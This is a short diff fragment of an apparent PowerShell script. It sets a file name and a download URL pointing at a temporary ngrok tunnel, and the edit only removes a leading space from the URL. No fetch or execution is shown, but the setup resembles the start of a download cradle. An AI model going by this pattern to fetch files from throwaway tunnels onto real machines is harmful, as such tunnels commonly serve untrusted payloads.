@@ -1,5 +1,5 @@
 $ProcName = "hello.txt"
-$WebFile = " http://89b6-8-20-101-109.ngrok.io/$ProcName"
+$WebFile = "http://89b6-8-20-101-109.ngrok.io/$ProcName"
  
 Clear-Host
  
